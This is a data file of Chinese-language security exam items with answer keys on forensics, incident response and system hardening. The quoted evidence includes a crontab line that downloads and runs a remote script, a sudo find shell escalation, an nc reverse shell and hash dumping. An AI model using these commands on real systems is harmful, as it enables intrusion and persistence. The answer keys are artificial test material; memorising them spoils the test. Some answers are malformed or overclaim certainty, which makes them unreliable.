      "basis": "證據監管鏈（Chain of Custody）要求證據自採集至法庭呈堂必須維持原始未受竄改狀態。直接在扣押的原物伺服器上開機並安裝軟體，會向磁碟寫入數以千計的新檔案、竄改大量的存取時間戳、覆寫暫存分區與未分配空間，徹底破壞數位證據的原始性與可信度，在法庭上將喪失證據能力。正確做法是使用防寫裝置（Write Blocker）製作原始硬碟的逐位元複製鏡像（Bit-stream Image），隨後在鏡像複本上進行分析。",
      "distractor": "- (A)、(B)、(D) 均為標準且合規的數位鑑識操作規範。",
      "full_solution": "- **正確答案**：**(C)**\n\n- **正解依據**：證據監管鏈（Chain of Custody）要求證據自採集至法庭呈堂必須維持原始未受竄改狀態。直接在扣押的原物伺服器上開機並安裝軟體，會向磁碟寫入數以千計的新檔案、竄改大量的存取時間戳、覆寫暫存分區與未分配空間，徹底破壞數位證據的原始性與可信度，在法庭上將喪失證據能力。正確做法是使用防寫裝置（Write Blocker）製作原始硬碟的逐位元複製鏡像（Bit-stream Image），隨後在鏡像複本上進行分析。\n\n- **干擾項辨析**：\n\n  - (A)、(B)、(D) 均為標準且合規的數位鑑識操作規範。"
    },
    {
      "id": 100,
      "exam": "exam_a",
      "domain": "領域七：資安事件應變與數位鑑識",
      "category": "資安鑑識 / 反鑑識技術檢測",
      "type": "single_choice",
      "question": "黑客入侵後常利用「時間戳偽造」（Timestomping）技術，將惡意木馬檔案的建立與修改時間竄改成與系統合法檔案（如 `ntoskrnl.exe`）一模一樣。鑑識專家通常比對 NTFS 中的哪兩個屬性時間戳差異，以識破 Timestomping 偽造？",
      "options": {
        "A": "比對 `$STANDARD_INFORMATION` 屬性與 `$FILE_NAME` 屬性中的時間戳（後者由核心維護，一般 Timestomping 工具通常未同步竄改）",
        "B": "比對硬碟序號與 MAC 位址",
        "C": "比對 BIOS 時間與 NTP 伺服器時間",
        "D": "檢查檔案名稱的大小寫狀態"
      },
      "answer": "A",
      "basis": "Timestomping 反鑑識工具在竄改時間戳時，通常僅呼叫 Win32 API `SetFileTime()`，該 API 只能修改 `$MFT` 中的 `$STANDARD_INFORMATION` 屬性時間。而 `$FILE_NAME` 屬性中的時間戳由 Windows 核心自動維護，常規 API 無法修改。鑑識人員比對兩者的 Modified / Created 時間，若 `$STANDARD_INFORMATION` 時間早於 `$FILE_NAME`，或者兩者產生顯著年代脫節，即可 100% 判定該檔案遭受過 Timestomping 人為時間偽造。",
      "distractor": "- (B)、(C)、(D) 均無法用於揭露 NTFS 內部時間戳的偽造痕跡。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：Timestomping 反鑑識工具在竄改時間戳時，通常僅呼叫 Win32 API `SetFileTime()`，該 API 只能修改 `$MFT` 中的 `$STANDARD_INFORMATION` 屬性時間。而 `$FILE_NAME` 屬性中的時間戳由 Windows 核心自動維護，常規 API 無法修改。鑑識人員比對兩者的 Modified / Created 時間，若 `$STANDARD_INFORMATION` 時間早於 `$FILE_NAME`，或者兩者產生顯著年代脫節，即可 100% 判定該檔案遭受過 Timestomping 人為時間偽造。\n\n- **干擾項辨析**：\n\n  - (B)、(C)、(D) 均無法用於揭露 NTFS 內部時間戳的偽造痕跡。"
    }
  ],
  "exam_b": [
    {
      "id": 1,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "根據【證據 A】，攻擊者所開啟之反向互動 Shell 網路工具 `nc.exe`，其進程 PID 為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 A：Volatility 3 記憶體處理序分析 (windows.pslist 輸出摘錄)】"
      ],
      "answer": "`3892`",
      "clean_answer": "3892",
      "basis": "在【證據 A】中，`nc.exe` 的進程列表行顯示：`PID: 3892`，`PPID: 3124`。",
      "full_solution": "- **官方標準答案**：`3892`\n\n- **解析依據**：在【證據 A】中，`nc.exe` 的進程列表行顯示：`PID: 3892`，`PPID: 3124`。"
    },
    {
      "id": 2,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "根據【證據 A】，`nc.exe` 的父進程（PPID）對應哪一個映像檔名？該父進程的 PID 為何？  \n\n  【作答區】：映像檔名：____________，PID：____________",
      "related_evidence": [
        "【證據 A：Volatility 3 記憶體處理序分析 (windows.pslist 輸出摘錄)】"
      ],
      "answer": "映像檔名：`cmd.exe`，PID：`3124`",
      "clean_answer": "映像檔名：`cmd.exe`，PID：`3124",
      "basis": "`nc.exe` 的 PPID 為 `3124`。反查 PID `3124`，其 ImageFileName 為 `cmd.exe`（該 cmd.exe 又由 powershell.exe PID 2048 衍生，展現出完整的反向互動 Shell 調用鏈）。",
      "full_solution": "- **官方標準答案**：映像檔名：`cmd.exe`，PID：`3124`\n\n- **解析依據**：`nc.exe` 的 PPID 為 `3124`。反查 PID `3124`，其 ImageFileName 為 `cmd.exe`（該 cmd.exe 又由 powershell.exe PID 2048 衍生，展現出完整的反向互動 Shell 調用鏈）。"
    },
    {
      "id": 3,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "根據【證據 A】，列表中哪一個進程屬於明顯偽裝合法系統進程的惡意排程/木馬進程（拼寫偽裝）？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 A：Volatility 3 記憶體處理序分析 (windows.pslist 輸出摘錄)】"
      ],
      "answer": "`svch0st.exe` (或 PID 4100)",
      "clean_answer": "svch0st.exe` (或 PID 4100)",
      "basis": "合法系統服務宿主進程為 `svchost.exe`（字母 o）。列表中出現 `svch0st.exe`（數字 0 代替字母 o），且其父進程為 `services.exe` (PID 612)，執行檔存放於 `C:\\Users\\Public\\`，屬於典型的進程名稱欺騙（Typosquatting Process Name）。",
      "full_solution": "- **官方標準答案**：`svch0st.exe` (或 PID 4100)\n\n- **解析依據**：合法系統服務宿主進程為 `svchost.exe`（字母 o）。列表中出現 `svch0st.exe`（數字 0 代替字母 o），且其父進程為 `services.exe` (PID 612)，執行檔存放於 `C:\\Users\\Public\\`，屬於典型的進程名稱欺騙（Typosquatting Process Name）。"
    },
    {
      "id": 4,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "根據【證據 B】，攻擊者接收 `nc.exe` 反彈 Shell 的外部 C2 伺服器 IP 位址與監聽端口為何？  \n\n  【作答區】：外部 IP：____________，端口：____________",
      "related_evidence": [
        "【證據 B：Volatility 3 網路活動分析 (windows.netscan 輸出摘錄)】"
      ],
      "answer": "外部 IP：`103.20.114.89`，端口：`4444`",
      "clean_answer": "外部 IP：`103.20.114.89`，端口：`4444",
      "basis": "在【證據 B】netscan 輸出中，PID `3892` (`nc.exe`) 建立了一條對外 `ESTABLISHED` TCP 連線：`192.168.50.10:49211 -> 103.20.114.89:4444`。端口 4444 為 Metasploit 等工具經典監聽端口。",
      "full_solution": "- **官方標準答案**：外部 IP：`103.20.114.89`，端口：`4444`\n\n- **解析依據**：在【證據 B】netscan 輸出中，PID `3892` (`nc.exe`) 建立了一條對外 `ESTABLISHED` TCP 連線：`192.168.50.10:49211 -> 103.20.114.89:4444`。端口 4444 為 Metasploit 等工具經典監聽端口。"
    },
    {
      "id": 5,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "根據【證據 B】，惡意偽裝進程 `svch0st.exe` 正向哪一個外部 IP 及端口維持連線？  \n\n  【作答區】：外部 IP：____________，端口：____________",
      "related_evidence": [
        "【證據 B：Volatility 3 網路活動分析 (windows.netscan 輸出摘錄)】"
      ],
      "answer": "外部 IP：`185.220.101.5`，端口：`8080`",
      "clean_answer": "外部 IP：`185.220.101.5`，端口：`8080",
      "basis": "在【證據 B】netscan 輸出中，PID `4100` (`svch0st.exe`) 正在向外連線至 `185.220.101.5:8080`，狀態為 `ESTABLISHED`。",
      "full_solution": "- **官方標準答案**：外部 IP：`185.220.101.5`，端口：`8080`\n\n- **解析依據**：在【證據 B】netscan 輸出中，PID `4100` (`svch0st.exe`) 正在向外連線至 `185.220.101.5:8080`，狀態為 `ESTABLISHED`。"
    },
    {
      "id": 6,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "根據【證據 C 事件記錄 1】，攻擊者最初發動的攻擊類型為何？發起源 IP 位址為何？  \n\n  【作答區】：攻擊類型：____________，發起源 IP：____________",
      "related_evidence": [
        "【證據 C：Windows 安全日誌 (Security.evtx 事件摘錄)】"
      ],
      "answer": "攻擊類型：SMB 暴力破解（或網路密碼爆破），發起源 IP：`192.168.50.250`",
      "clean_answer": "攻擊類型：SMB 暴力破解（或網路密碼爆破），發起源 IP：`192.168.50.250",
      "basis": "【證據 C】Event 4625 在短短 13 分鐘內大量產生 1,420 次失敗記錄，來源均為 `192.168.50.250`，且 Logon Type 為 3（Network 網路登入，對應 SMB 445 端口），符合自動化密碼暴力破解特徵。",
      "full_solution": "- **官方標準答案**：攻擊類型：SMB 暴力破解（或網路密碼爆破），發起源 IP：`192.168.50.250`\n\n- **解析依據**：【證據 C】Event 4625 在短短 13 分鐘內大量產生 1,420 次失敗記錄，來源均為 `192.168.50.250`，且 Logon Type 為 3（Network 網路登入，對應 SMB 445 端口），符合自動化密碼暴力破解特徵。"
    },
    {
      "id": 7,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "承上題，被暴力破解的目標帳號名稱為何？狀態代碼 `0xC000006A` 代表何種錯誤？  \n\n  【作答區】：目標帳號：____________，代碼意義：____________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "目標帳號：`Administrator`，代碼意義：密碼錯誤（Bad Password）",
      "clean_answer": "目標帳號：`Administrator`，代碼意義：密碼錯誤（Bad Password）",
      "basis": "Event 4625 明確標註 `Account Name: Administrator`，失敗狀態碼 `0xC000006A` 在 Windows NT 狀態碼中定義為 `STATUS_WRONG_PASSWORD`（使用者名稱存在但密碼不正確）。",
      "full_solution": "- **官方標準答案**：目標帳號：`Administrator`，代碼意義：密碼錯誤（Bad Password）\n\n- **解析依據**：Event 4625 明確標註 `Account Name: Administrator`，失敗狀態碼 `0xC000006A` 在 Windows NT 狀態碼中定義為 `STATUS_WRONG_PASSWORD`（使用者名稱存在但密碼不正確）。"
    },
    {
      "id": 8,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "根據【證據 C 事件記錄 2】，攻擊者在暴力破解失敗後，成功透過哪一個受害帳號登入系統？登入類型（Logon Type）為何？  \n\n  【作答區】：成功帳號：____________，Logon Type：____________",
      "related_evidence": [
        "【證據 C：Windows 安全日誌 (Security.evtx 事件摘錄)】"
      ],
      "answer": "成功帳號：`svc_backup`，Logon Type：`3` (Network)",
      "clean_answer": "成功帳號：`svc_backup`，Logon Type：`3` (Network)",
      "basis": "【證據 C 事件記錄 2】顯示在 02:28:45，Event ID 4624（成功登入），目標帳號為備份服務帳號 `svc_backup`，Logon Type 為 3。",
      "full_solution": "- **官方標準答案**：成功帳號：`svc_backup`，Logon Type：`3` (Network)\n\n- **解析依據**：【證據 C 事件記錄 2】顯示在 02:28:45，Event ID 4624（成功登入），目標帳號為備份服務帳號 `svc_backup`，Logon Type 為 3。"
    },
    {
      "id": 9,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "根據【證據 C 事件記錄 3】，攻擊者在受害伺服器上建立的持久化服務名稱為何？該服務所指派的執行檔實體路徑為何？  \n\n  【作答區】：服務名稱：____________，實體路徑：____________",
      "related_evidence": [
        "【證據 C：Windows 安全日誌 (Security.evtx 事件摘錄)】"
      ],
      "answer": "服務名稱：`WindowsUpdateAssist`，實體路徑：`C:\\Users\\Public\\svch0st.exe -k netsvcs`",
      "clean_answer": "服務名稱：`WindowsUpdateAssist`，實體路徑：`C:\\Users\\Public\\svch0st.exe -k netsvcs",
      "basis": "【證據 C 事件記錄 3】Event 7045 為服務安裝日誌，攻擊者偽裝微軟更新服務建立後門。",
      "full_solution": "- **官方標準答案**：服務名稱：`WindowsUpdateAssist`，實體路徑：`C:\\Users\\Public\\svch0st.exe -k netsvcs`\n\n- **解析依據**：【證據 C 事件記錄 3】Event 7045 為服務安裝日誌，攻擊者偽裝微軟更新服務建立後門。"
    },
    {
      "id": 10,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "根據【證據 C 事件記錄 4】，攻擊者透過 PowerShell 執行的命令列參數包含 `-enc`，此參數代表後方字串採用何種編碼？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 C：Windows 安全日誌 (Security.evtx 事件摘錄)】"
      ],
      "answer": "Base64 編碼",
      "clean_answer": "Base64 編碼",
      "basis": "PowerShell 的 `-enc`（`-EncodedCommand`）參數專門接收以 Base64 編碼的命令字串。",
      "full_solution": "- **官方標準答案**：Base64 編碼\n\n- **解析依據**：PowerShell 的 `-enc`（`-EncodedCommand`）參數專門接收以 Base64 編碼的命令字串。"
    },
    {
      "id": 11,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "若要將 Base64 編碼的 PowerShell 命令解碼，PowerShell 內部預設採用的字元編碼標準（Encoding）為何（UTF-8、ASCII 或 Unicode/UTF-16LE）？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`Unicode` (或 `UTF-16LE`)",
      "clean_answer": "Unicode` (或 `UTF-16LE`)",
      "basis": "PowerShell 底層處理 `-EncodedCommand` 時，預設使用 UTF-16 Little Endian（每字元 2 位元組）。若解碼時誤用 UTF-8 會導致亂碼。",
      "full_solution": "- **官方標準答案**：`Unicode` (或 `UTF-16LE`)\n\n- **解析依據**：PowerShell 底層處理 `-EncodedCommand` 時，預設使用 UTF-16 Little Endian（每字元 2 位元組）。若解碼時誤用 UTF-8 會導致亂碼。"
    },
    {
      "id": 12,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "根據【證據 D】，攻擊者登入 Linux 主機所使用的系統帳號名稱為何？登入方式是密碼認證還是公鑰認證？  \n\n  【作答區】：帳號：____________，認證方式：____________",
      "related_evidence": [
        "【證據 D：Linux 主機日誌與檔案節錄】"
      ],
      "answer": "帳號：`deployer`，認證方式：公鑰認證（Public Key）",
      "clean_answer": "帳號：`deployer`，認證方式：公鑰認證（Public Key）",
      "basis": "【證據 D】`/var/log/auth.log` 載明：`Accepted publickey for deployer from 192.168.50.250 port 52140`。",
      "full_solution": "- **官方標準答案**：帳號：`deployer`，認證方式：公鑰認證（Public Key）\n\n- **解析依據**：【證據 D】`/var/log/auth.log` 載明：`Accepted publickey for deployer from 192.168.50.250 port 52140`。"
    },
    {
      "id": 13,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "根據【證據 D】，攻擊者在 Linux 上使用 `sudo` 執行了哪一個指令實現無密碼本機提權？提權利用了該指令的哪一個參數？  \n\n  【作答區】：提權指令：____________，參數：____________",
      "related_evidence": [
        "【證據 D：Linux 主機日誌與檔案節錄】"
      ],
      "answer": "提權指令：`/usr/bin/find`，參數：`-exec` (執行 `/usr/bin/find . -exec /bin/sh \\;`)",
      "clean_answer": "提權指令：`/usr/bin/find`，參數：`-exec` (執行 `/usr/bin/find . -exec /bin/sh \\;`)",
      "basis": "【證據 D】`sudo: deployer : USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh \\;`。利用 `find` 的 `-exec` 參數可直接帶起 root 權限的 `/bin/sh`，此為 GTFOBins 標準提權手段。",
      "full_solution": "- **官方標準答案**：提權指令：`/usr/bin/find`，參數：`-exec` (執行 `/usr/bin/find . -exec /bin/sh \\;`)\n\n- **解析依據**：【證據 D】`sudo: deployer : USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh \\;`。利用 `find` 的 `-exec` 參數可直接帶起 root 權限的 `/bin/sh`，此為 GTFOBins 標準提權手段。"
    },
    {
      "id": 14,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "根據【證據 D】，攻擊者在 `/etc/crontab` 中寫入的後門任務執行頻率為何？下載執行之惡意腳本 URL 為何？  \n\n  【作答區】：執行頻率：____________，惡意 URL：____________",
      "related_evidence": [
        "【證據 D：Linux 主機日誌與檔案節錄】"
      ],
      "answer": "執行頻率：每 10 分鐘一次（`*/10 * * * *`），惡意 URL：`http://103.20.114.89/check.sh`",
      "clean_answer": "執行頻率：每 10 分鐘一次（`*/10 * * * *`），惡意 URL：`http://103.20.114.89/check.sh",
      "basis": "【證據 D】`/etc/crontab` 記載 `*/10 * * * * root curl -fsSL http://103.20.114.89/check.sh | bash`。",
      "full_solution": "- **官方標準答案**：執行頻率：每 10 分鐘一次（`*/10 * * * *`），惡意 URL：`http://103.20.114.89/check.sh`\n\n- **解析依據**：【證據 D】`/etc/crontab` 記載 `*/10 * * * * root curl -fsSL http://103.20.114.89/check.sh | bash`。"
    },
    {
      "id": 15,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "在 Volatility 3 中，若要將 PID 4100 的進程記憶體完整轉儲至本機目錄分析，應執行哪一條命令？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`vol -f memory.dmp windows.memmap --pid 4100 --dump` (或使用 `windows.dumpfiles --pid 4100`)",
      "clean_answer": "vol -f memory.dmp windows.memmap --pid 4100 --dump` (或使用 `windows.dumpfiles --pid 4100`)",
      "basis": "Volatility 3 中透過 `windows.memmap` 配合 `--dump` 參數可提取指定 PID 的記憶體映射檔案。",
      "full_solution": "- **官方標準答案**：`vol -f memory.dmp windows.memmap --pid 4100 --dump` (或使用 `windows.dumpfiles --pid 4100`)\n\n- **解析依據**：Volatility 3 中透過 `windows.memmap` 配合 `--dump` 參數可提取指定 PID 的記憶體映射檔案。"
    },
    {
      "id": 16,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "在 Volatility 3 中，若要提取 Windows SAM 資料庫中的本地使用者 NTLM Hash，應使用哪一個插件？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`windows.hashdump`",
      "clean_answer": "windows.hashdump",
      "basis": "`windows.hashdump` 插件能從記憶體中的 SYSTEM 與 SAM 登錄檔蜂巢提取所有本機使用者帳號與對應的 NTLM 雜湊值。",
      "full_solution": "- **官方標準答案**：`windows.hashdump`\n\n- **解析依據**：`windows.hashdump` 插件能從記憶體中的 SYSTEM 與 SAM 登錄檔蜂巢提取所有本機使用者帳號與對應的 NTLM 雜湊值。"
    },
    {
      "id": 17,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "在 Linux 環境中，若要徹底清除攻擊者在 `/etc/crontab` 中留下的定時任務，最合適的處置指令與編輯流程為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "使用文字編輯器（如 `vim /etc/crontab`）刪除惡意 curl 任務行，並檢查 `/etc/cron.*` 與 `/var/spool/cron/crontabs/` 是否有殘留後門，隨後重啟 cron 守護進程。",
      "clean_answer": "使用文字編輯器（如 `vim /etc/crontab`）刪除惡意 curl 任務行，並檢查 `/etc/cron.*` 與 `/var/spool/cron/crontabs/` 是否有殘留後門，隨後重啟 cron 守護進程。",
      "basis": "直接編輯系統級 crontab 移除惡意行，同時全面排查所有關聯 cron 目錄。",
      "full_solution": "- **官方標準答案**：使用文字編輯器（如 `vim /etc/crontab`）刪除惡意 curl 任務行，並檢查 `/etc/cron.*` 與 `/var/spool/cron/crontabs/` 是否有殘留後門，隨後重啟 cron 守護進程。\n\n- **解析依據**：直接編輯系統級 crontab 移除惡意行，同時全面排查所有關聯 cron 目錄。"
    },
    {
      "id": 18,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "在 Windows 事件日誌中，Logon Type 3 代表何種登入方式？（如本機互動、網路連線、遠端桌面）  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "網路連線登入（Network Logon，如 SMB 檔案共用或 IPC$ 連線）",
      "clean_answer": "網路連線登入（Network Logon，如 SMB 檔案共用或 IPC$ 連線）",
      "basis": "Windows Logon Type 3 定義為 Network Logon，非本機互動（Type 2）亦非遠端桌面（Type 10）。",
      "full_solution": "- **官方標準答案**：網路連線登入（Network Logon，如 SMB 檔案共用或 IPC$ 連線）\n\n- **解析依據**：Windows Logon Type 3 定義為 Network Logon，非本機互動（Type 2）亦非遠端桌面（Type 10）。"
    },
    {
      "id": 19,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "在防守方事件應變流程（NIST SP 800-61）中，資安人員在確認 C2 連線後，第一時間拔除受害主機網線或切斷虛擬機 vNIC，此動作屬於六階段中的哪一個階段？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "圍堵階段（Containment）",
      "clean_answer": "圍堵階段（Containment）",
      "basis": "NIST SP 800-61 中，拔除網線、切斷網路連線、隔離受害主機以防止威脅橫向擴散與資料持續外洩，屬於標準的「圍堵（Containment）」處置。",
      "full_solution": "- **官方標準答案**：圍堵階段（Containment）\n\n- **解析依據**：NIST SP 800-61 中，拔除網線、切斷網路連線、隔離受害主機以防止威脅橫向擴散與資料持續外洩，屬於標準的「圍堵（Containment）」處置。"
    },
    {
      "id": 20,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "若攻擊者在受害伺服器上刪除了 `svch0st.exe` 檔案，鑑識人員在 `C:\\Windows\\Prefetch` 目錄中找到名為 `SVCH0ST.EXE-XXXXXXXX.pf` 的檔案，該檔案能否證明該程式曾被執行過？（是/否）  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "是",
      "clean_answer": "是",
      "basis": "Prefetch 檔案由 Windows 核心快取管理器在應用程式實際執行時自動產生。若存在 `SVCH0ST.EXE-XXXXXXXX.pf`，即具備法庭級證據能力，能 100% 證明該程式曾在該系統上執行過。",
      "full_solution": "- **官方標準答案**：是\n\n- **解析依據**：Prefetch 檔案由 Windows 核心快取管理器在應用程式實際執行時自動產生。若存在 `SVCH0ST.EXE-XXXXXXXX.pf`，即具備法庭級證據能力，能 100% 證明該程式曾在該系統上執行過。"
    },
    {
      "id": 21,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "在對受害主機進行硬碟取證鏡像時，為了防止作業系統開機時主動寫入快取，必須在硬碟與採證主機之間串接何種硬體設備？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "硬體防寫裝置（Write Blocker / 唯讀防寫橋接器）",
      "clean_answer": "硬體防寫裝置（Write Blocker / 唯讀防寫橋接器）",
      "basis": "取證採集標準規範，必須串接硬體 Write Blocker 阻斷所有對原始硬碟的寫入訊號。",
      "full_solution": "- **官方標準答案**：硬體防寫裝置（Write Blocker / 唯讀防寫橋接器）\n\n- **解析依據**：取證採集標準規範，必須串接硬體 Write Blocker 阻斷所有對原始硬碟的寫入訊號。"
    },
    {
      "id": 22,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "計算取證鏡像完整性時，業界標準規定至少計算哪兩種密碼學雜湊值以確保法庭證據不可否認性？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`MD5` 與 `SHA-256` (或 `SHA-1`)",
      "clean_answer": "MD5` 與 `SHA-256` (或 `SHA-1`)",
      "basis": "數位取證規範（ISO/IEC 27037），通常同時計算雙重獨立雜湊演算法（如 MD5 + SHA-256）交叉校驗鏡像完整性。",
      "full_solution": "- **官方標準答案**：`MD5` 與 `SHA-256` (或 `SHA-1`)\n\n- **解析依據**：數位取證規範（ISO/IEC 27037），通常同時計算雙重獨立雜湊演算法（如 MD5 + SHA-256）交叉校驗鏡像完整性。"
    },
    {
      "id": 23,
      "exam": "exam_b",
      "domain": "第一部分：IR 事件應變與記憶體取證演練",
      "category": "事件應變與記憶體取證",
      "type": "lab_question",
      "question": "根據全案證據鏈，請簡要按時間先後排序攻擊者的五個入侵步驟：  \n\n  (1) 安裝 Windows 惡意服務持久化；(2) 透過 SSH 橫向移動至 Linux 並利用 sudo find 提權；(3) 對 Windows 進行 SMB 密碼爆破並登入；(4) 反彈 NC Shell；(5) 建立 Crontab 惡意排程。  \n\n  【作答區】：正確入侵時間順序：（填寫數字序號）____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`(3) -> (4) -> (1) -> (2) -> (5)`",
      "clean_answer": "(3) -> (4) -> (1) -> (2) -> (5)",
      "basis": "1. (3) 02:15~02:28 SMB 密碼爆破並登入成功；\n\n  2. (4) 02:46 反彈 NC Shell；\n\n  3. (1) 02:50 安裝 Windows 惡意服務持久化；\n\n  4. (2) 03:02 透過 SSH 橫向移動至 Linux 並利用 sudo find 提權；\n\n  5. (5) 提權後在 Linux 建立 Crontab 惡意排程。",
      "full_solution": "- **官方標準答案**：`(3) -> (4) -> (1) -> (2) -> (5)`\n\n- **解析依據**：\n\n  1. (3) 02:15~02:28 SMB 密碼爆破並登入成功；\n\n  2. (4) 02:46 反彈 NC Shell；\n\n  3. (1) 02:50 安裝 Windows 惡意服務持久化；\n\n  4. (2) 03:02 透過 SSH 橫向移動至 Linux 並利用 sudo find 提權；\n\n  5. (5) 提權後在 Linux 建立 Crontab 惡意排程。"
    },
    {
      "id": 24,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "OpenSSH 加固：欲徹底停用 root 遠端登入，應在 `/etc/ssh/sshd_config` 中將哪一個參數修改為何值？  \n\n  【作答區】：參數：____________________，值：____________________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "參數：`PermitRootLogin`，值：`no`",
      "clean_answer": "參數：`PermitRootLogin`，值：`no",
      "basis": "在 `/etc/ssh/sshd_config` 設定 `PermitRootLogin no`，禁止 root 直登。",
      "full_solution": "- **官方標準答案**：參數：`PermitRootLogin`，值：`no`\n\n- **解析依據**：在 `/etc/ssh/sshd_config` 設定 `PermitRootLogin no`，禁止 root 直登。"
    },
    {
      "id": 25,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "OpenSSH 加固：欲停用密碼認證並僅允許公鑰登入，應修改哪一個參數為何值？  \n\n  【作答區】：參數：____________________，值：____________________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "參數：`PasswordAuthentication`，值：`no`",
      "clean_answer": "參數：`PasswordAuthentication`，值：`no",
      "basis": "設定 `PasswordAuthentication no` 關閉密碼認證，強制走公鑰認證。",
      "full_solution": "- **官方標準答案**：參數：`PasswordAuthentication`，值：`no`\n\n- **解析依據**：設定 `PasswordAuthentication no` 關閉密碼認證，強制走公鑰認證。"
    },
    {
      "id": 26,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "OpenSSH 加固：設定連線空閒逾時自動斷開（例如每 60 秒發送一次心跳，連續 3 次無回應即斷線），應配置哪兩個參數？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "`ClientAliveInterval 60` 與 `ClientAliveCountMax 3`",
      "clean_answer": "ClientAliveInterval 60` 與 `ClientAliveCountMax 3",
      "basis": "`ClientAliveInterval` 指定伺服器向客戶端發送空閒檢查間隔（秒），`ClientAliveCountMax` 指定累計未回應次數後斷開連線。",
      "full_solution": "- **官方標準答案**：`ClientAliveInterval 60` 與 `ClientAliveCountMax 3`\n\n- **解析依據**：`ClientAliveInterval` 指定伺服器向客戶端發送空閒檢查間隔（秒），`ClientAliveCountMax` 指定累計未回應次數後斷開連線。"
    },
    {
      "id": 27,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "帳號密碼策略：在 `/etc/login.defs` 中，欲設定密碼最長使用期限為 90 天，應修改哪一個設定項？  \n\n  【作答區】：____________________",
      "related_evidence": [
